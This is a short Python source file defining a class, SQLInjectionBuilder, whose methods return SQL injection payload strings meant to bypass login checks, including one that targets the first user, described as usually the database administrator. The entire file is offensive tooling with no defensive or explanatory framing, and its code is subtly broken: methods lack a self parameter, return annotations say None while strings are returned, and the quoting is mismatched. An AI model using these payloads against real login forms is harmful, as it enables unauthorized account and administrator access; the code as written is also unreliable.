class SQLInjectionBuilder:
    def __init__(self, engine) -> None:
        self.engine = engine

    def login_user(usr_id: int) -> None:
        return f"\' or {usr_id}=\"{usr_id}\";-- "

    def login_admin() -> None:
        """
        Returns a possible way of getting to the first user on the database
        It usually means the administrator of the database
        """
        return SQLInjectionBuilder.login_user(1)